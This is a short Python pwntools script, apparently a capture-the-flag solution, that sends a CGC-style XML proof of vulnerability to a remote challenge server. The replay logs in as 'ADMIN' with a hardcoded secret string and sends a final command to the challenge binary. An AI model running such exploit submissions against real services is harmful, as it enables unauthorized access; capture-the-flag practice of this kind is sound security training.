#!/usr/bin/env python


from pwn import *

xml_pov = '''<?xml version="1.0" standalone="no" ?>
<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
<pov>
    <cbid>CGC_2</cbid>
    <replay>
        <read>
            <length>41</length>
        </read>
        <read>
            <length>41</length>
        </read>
        <read>
            <length>41</length>
        </read>
        <read>
            <length>19</length>
        </read>
        <read>
            <length>6</length>
        </read>

        <write>
            <data>ADMIN\x0a</data>
        </write>

        <read>
            <length>16</length>
        </read>

        <write>
	       <data>SHOW_ME_THE_M0N3Y_TURN_UP\x0a</data>
	    </write>

        <read>
            <length>17</length>
        </read>
        <read>
            <length>2</length>
        </read>

        <write>
           <data>CK\x0a</data>
        </write>

        <read>
            <length>6</length>
        </read>

    </replay>
</pov>'''

r = remote('cgc.cykor.kr', 34523)
r.recvuntil('What type of your PoV? (BIN / XML)')
r.sendline("XML")
r.recvuntil('How many bytes is your XML?')
r.sendline(str(len(xml_pov)))
r.recvuntil('Ok.... send it :)')
r.send(xml_pov)

r.interactive()